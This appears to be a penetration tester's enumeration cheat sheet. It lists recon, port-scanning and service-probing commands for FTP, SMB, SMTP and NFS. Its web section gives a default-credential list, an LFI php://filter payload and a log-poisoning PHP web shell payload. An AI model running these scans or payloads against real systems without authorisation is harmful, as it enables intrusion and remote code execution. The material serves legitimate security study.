# Enumeration Quick Reference 
## Checklist 
- [ ] Recon 
- [ ] (If given a range): what hosts are on the network
- [ ] Open well known ports (0-1023)
- [ ] What are these ports used for (banner grab) 
- [ ] Open high ports (12024-65535) 
- [ ] Operating system 
- [ ] FTP or SMB anon log in 
- [ ] Exploitable services versions (searchsploit, github, google) 
- [ ] Web enum (see checklist below) 
- [ ] Brute force any services / log in pages 

## Recon   
### DNS Look Up 
whois, nslookup, dig, host <-manual tools   
Dierce, DNSenum, DNSrecon <-automated tools  
[The Harvester](https://github.com/laramies/theharvester)  
[Recon-ng](https://github.com/lanmaster53/recon-ng)  

    nslookup -type=any <DOMAIN>   
    host -t axfr -l <DOMAIN> <DNSSERVER>   
    dig -t mx <DOMAIN>  
    dig -t any <DOMAIN>
    
## Network Enum:  
    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "    
    nmap -sn 172.16.0.0/24 

## Host enum 
**Identify os, services/ports/versions. Save results to text files. **   

    autorecon 127.0.0.1  
    nmap -A -T 4 -vv 127.0.0.1
    nmap -sV -p- --min-rate 200 -vv 127.0.0.1  

    nc -nvzw1 192.168.53.120 1-65535 2>&1 | grep open       

## Service Enum   

nmap scripts: /usr/share/nmap/scripts   
nmap --script <name>    --script-help 
	
**Port 21: FTP**
[Enumerating ftp](https://book.hacktricks.xyz/pentesting/pentesting-ftp)   
	
	anon log in: ftp / no password	or 	Anonymous: asdfasdf 
	
**Port 25: SMTP**   
	
	smtp-user-enum -M VRF -u <user.txt> -t <ip> 
	
**Port 139: SMB** 
check for unauthenticated login, enum with smbmap 
	
    smbclient -L <IP>
    rpcclient -U "" <IP>
    smbclient -U <HOST> -L <IP>
    /usr/bin/smbclient \\\\<IP>\\share <HOST>  
	
**Port 2049: NFS**  
	[Pentesting NFS](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)  
	[No root squash](http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html)
	
    showmount -e 127.0.0.1
    mkdir /mnt/share   
    sudo mount -t nfs -o v2 127.0.0.1/share /mnt/share -o nolock 
	
## Web Enum 
- [ ] Scan for sub directories and pages 
- [ ] Log in pages - guess default creds, admin:admin, admin:password 
- [ ] File upload (what types of files are accepted) 
- [ ] Intercept HTTP requests with Burp 	
	
	
    [Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions  
	
    nmap http scripts 
	
    nikto -h http://127.0.0.1:80/ 
	
    dirb http://127.0.0.1/   (default word list: common.txt) 
	
Local File Include  
[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
	
	
	/etc/passwd, etc.
	can you include a remote file?
	?test=php://filter/convert.base64-encode/resource=/filepath  base64 encode /decode  
Log Poisoning 
	open: /log/apache2/access.log 
	send payload as user agent string: <?php system($_GET['cmd']); ?>    
	/log/apache2/access.log&cmd=id    

	
[SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
	
Local File Inclusion 
 
	  
Web vulnerabilities to gain access to the system - paper 
https://www.exploit-db.com/papers/13017/  
Bypassing File Upload Restrictions 
http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html  
Basic SQLi 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html http://www.sqlinjection.net/login/
